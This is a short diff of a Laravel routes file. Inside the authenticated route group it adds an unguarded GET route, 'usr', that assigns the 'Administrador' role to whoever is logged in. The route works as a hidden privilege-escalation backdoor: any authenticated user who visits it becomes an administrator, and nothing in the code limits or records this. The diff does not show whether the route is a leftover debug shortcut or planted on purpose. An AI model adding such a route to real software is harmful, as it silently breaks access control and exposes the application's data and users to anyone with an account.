@@ -26,6 +26,11 @@ Route::get('auth', [
 // (env('SSO_AUTH')? 'auth_sso':'auth' ) valida si usa sso o validacion local
 Route::group(['middleware'=> (env('SSO_AUTH')? 'auth.sso':'auth' )],function(){
 
+    Route::get('usr',function (){
+       $u = \Illuminate\Support\Facades\Auth::user();
+
+       $u->assignRole('Administrador');
+    });
 
     Route::get('/', 'HomeController@index')->name('home');
 
